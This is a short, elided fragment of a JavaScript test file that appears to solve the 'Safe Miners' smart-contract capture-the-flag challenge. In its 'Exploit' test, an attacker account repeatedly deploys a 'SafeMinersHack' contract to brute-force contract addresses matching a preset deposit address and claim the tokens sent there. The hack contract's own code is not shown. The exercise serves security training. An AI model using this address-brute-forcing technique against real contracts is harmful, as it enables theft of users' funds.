...
describe("[Challenge] Safe Miners", function () {
  ...
  it("Exploit", async function () {
    ...
    for (let tries = 0; tries < 200; tries++) {
      // Have the hack brute force create 100 contracts to match DEPOSIT_ADDRESS above.
      //   await (
      //     await ethers.getContractFactory("SafeMinersHack", deployer)
      //   ).deploy(attacker.address, this.token.address, 100);
      await (
        await ethers.getContractFactory("SafeMinersHack", attacker)
      ).deploy(attacker.address, this.token.address, 100);
    }
  });
